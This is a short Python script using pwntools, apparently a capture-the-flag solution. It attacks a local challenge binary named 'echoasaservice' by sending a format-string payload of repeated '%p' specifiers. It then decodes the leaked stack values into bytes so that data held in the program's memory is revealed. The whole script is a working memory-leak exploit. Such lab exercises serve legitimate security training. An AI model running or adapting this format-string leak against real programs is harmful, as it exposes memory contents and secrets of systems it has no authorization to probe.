from pwn import *


p = process("./echoasaservice")
p.recvuntil("Echo as a service (EaaS")

payload = '%p ' * 12


p.sendline(payload)
p.recvline()

response = p.recvline()

for value in response.split(): 
    try: 
        print(p64(int(value, 16)))
    
    except: 
        pass